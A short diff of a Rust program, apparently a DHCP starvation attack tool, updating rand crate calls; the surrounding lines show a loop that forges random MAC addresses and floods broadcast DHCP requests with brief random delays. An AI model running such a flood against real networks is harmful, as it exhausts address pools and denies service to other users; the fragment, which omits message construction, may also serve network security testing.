@@ -10,7 +10,7 @@ pub(crate) fn main() -> anyhow::Result<()> {
     println!("Starting DHCP starvation attack...");
 
     loop {
-        let mut rng = rand::thread_rng();
+        let mut rng = rand::rng();
         let mut mac = [0u8; 6];
         rng.fill(&mut mac);
         mac[0] |= 0x02;
@@ -37,6 +37,6 @@ pub(crate) fn main() -> anyhow::Result<()> {
         msg.encode(&mut e)?;
         socket.send_to(&buf, ("255.255.255.255", 67))?;
 
-        thread::sleep(Duration::from_millis(rng.gen_range(5..15)));
+        thread::sleep(Duration::from_millis(rng.random_range(5..15)));
     }
 }
